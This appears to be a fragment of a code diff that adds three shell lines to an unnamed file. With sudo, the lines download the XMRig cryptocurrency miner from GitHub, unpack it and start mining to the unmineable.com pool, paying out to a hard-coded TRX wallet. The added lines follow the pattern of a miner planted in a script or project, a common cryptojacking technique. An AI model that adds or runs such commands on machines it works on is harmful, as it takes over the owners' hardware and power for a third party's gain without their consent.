@@ -1,0 +1,3 @@
+sudo wget -O a.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
+sudo tar -xvzf a.tar.gz && cd xmrig*
+./xmrig -o rx.unmineable.com:3333 -u TRX:TL7gHeZdetj3XBKiQEqUobApjbbFRBi23D.CLASSIC -p x -k -a rx/0
